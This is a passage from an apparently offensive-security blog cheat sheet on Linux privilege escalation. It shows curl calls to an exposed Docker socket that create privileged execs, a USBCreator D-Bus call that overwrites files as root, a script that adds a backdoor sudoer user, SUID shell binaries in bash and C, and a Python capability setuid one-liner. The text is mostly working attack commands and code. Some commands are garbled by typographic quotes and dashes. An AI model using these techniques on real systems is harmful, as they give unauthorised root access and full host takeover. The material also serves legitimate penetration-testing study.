By default, when the `docker` command is executed on a host, an API call to the docker daemon is made via a non-networked UNIX socket located at `/var/run/docker.sock`. However, many containers and guides require you to expose this socket file as a volume within a container or in some cases, expose it on a TCP port. Docker containers that expose `/var/run/docker.sock`, locally or remotely, could lead to a full environment take over.

### Check if socket is available

</code></pre></div></div>
<p>ls -alh /var/run/docker.sock</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
### List all containers

</code></pre></div></div>
<p>curl -ik –unix-socket /var/run/docker.sock http://<docker_host>:PORT/containers/json</docker_host></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
### Create an exec

</code></pre></div></div>
<p>curl -ik -X POST –unix-socket /var/run/docker.sock -H “Content-Type: application/json” –data-binary ‘{“AttachStdin”: true,”AttachStdout”: true,”AttachStderr”: true,”Cmd”: [“cat”, “/etc/passwd”],”DetachKeys”: “ctrl-p,ctrl-q”,”Privileged”: true,”Tty”: true}’ http://<docker_host>:PORT/containers/<container_id>/exec</container_id></docker_host></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
### Start the exec

</code></pre></div></div>
<p>curl -ik -X POST –unix-socket /var/run/docker.sock -H “Content-Type: application/json” –data-binary ‘{“Detach”: false,”Tty”: true} http://<docker_host>:PORT/exec/<exec_id>/start'</exec_id></docker_host></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
* [https://dejandayoff.com/the-danger-of-exposing-docker.sock/](https://dejandayoff.com/the-danger-of-exposing-docker.sock/)

# USBCreator D-Bus

A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the **sudoer group to bypass the password** security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root – **without supplying a password.**

</code></pre></div></div>
<p>gdbus call –system –dest com.ubuntu.USBCreator –object-path /com/ubuntu/USBCreator –method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /id_rsa true</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

# Executing files with root

## Adding a new SUDOER user (Bash)

We can create a new user and add it to the sudoers file:

</code></pre></div></div>
<p>#!/bin/bash</p>

<p>useradd dirty_sock -m -p ‘$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.’ -s /bin/bash
usermod -aG sudo dirty_sock
echo “dirty_sock    ALL=(ALL:ALL) ALL” » /etc/sudoers</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
## Creating a SUID shell (bash)

We can copy the bash file to temp and give it SUID permissions.

</code></pre></div></div>
<p>cp /bin/bash /tmp/bash
chmod u+s /tmp/bash</p>

<p>/tmp/bash -p</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
## Creating a SUID file (c)

</code></pre></div></div>
<p>#include <unistd.h>
int main()
{
    setreuid(0,0);
    execl("/bin/bash", "bash", (char *)NULL);
    return 0;
}</unistd.h></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
## Creating a SUID shell (C)

We can write the following C code in order to obtain a bash shell:

</code></pre></div></div>
<p>#include <stdio.h>
#include <unistd.h></unistd.h></stdio.h></p>

<p>int main (void) {
    char *argv[] = { “/bin/bash”, “-p”, NULL };
    execve(argv[0], argv, NULL);
}</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
We just need to compile and give SUID permissions from root in our attacking machine.

</code></pre></div></div>
<p>gcc -m32 shell.c -o shell
root@kali $ chmod +s shell</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
Finally we need to transfer the file with the command execution.

</code></pre></div></div>
<p>/tmp/shell -p</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
# Capabilities

Capabilities are those permissions that divide the privileges of kernel user or kernel level programs into small pieces so that a process can be allowed sufficient power to perform specific privileged tasks.

Search files with capabilities:

</code></pre></div></div>
<p>getcap -r / 2&gt;/dev/null</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
## Python Capability

</code></pre></div></div>
<p>python3 -c ‘import os; os.setuid(0); os.system(“/bin/bash”)’
```</p>

<h1 id="references">References:</h1>

<ul>
  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md</a></li>
  <li><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege\_escalation\_-\_linux.html">https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html</a></li>
  <li><a href="https://payatu.com/guide-linux-privilege-escalation">https://payatu.com/guide-linux-privilege-escalation</a></li>
  <li><a href="https://www.hackingarticles.in/lxd-privilege-escalation/">https://www.hackingarticles.in/lxd-privilege-escalation/</a></li>
  <li><a href="https://int0x33.medium.com/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e">https://int0x33.medium.com/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e</a></li>
  <li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-limited-bash">https://book.hacktricks.xyz/linux-unix/privilege-escalation/</a></li>
  <li><a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/</a></li>
  <li><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/">https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/</a></li>
</ul>

			</article>
		</section>

		<script>
			document.getElementById("open-nav").addEventListener("click", function () {
				document.body.classList.toggle("nav-open");
			});
		</script>
	</body>
</html>
